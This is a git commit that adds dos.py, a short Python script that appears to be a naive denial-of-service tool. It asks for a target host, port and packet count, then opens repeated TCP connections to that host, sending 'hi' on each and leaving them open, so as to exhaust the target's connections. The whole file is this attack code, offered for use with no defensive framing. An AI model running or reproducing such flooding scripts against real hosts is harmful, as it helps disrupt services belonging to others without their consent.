0ec73013fcbb14380bbcfffcc0b483523b925f52
Guilherme Dias <80716667+Siluryan@users.noreply.github.com>
2022-07-03 09:18:09 -0300

    Create dos.py

---
+++ dos.py
@@ -0,0 +1,22 @@
+import http.client
+import socket
+
+if __name__ == '__main__':	
+
+	host = input('Enter Host: ')
+	host = host.replace("http://", "")
+	open_port = int(input("Open Port: "))
+	conn = input("Number of Packets: ")
+	message = "hi"
+	message = message.encode("ascii")
+
+	def dos_run(host, port):
+		cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		cs.connect((host, port))
+		cs.send(message)
+		#cs.close()    	   		
+
+	for i in range(int(conn)):
+		dos_run(host, open_port)
+		i += 1
+		print(i)
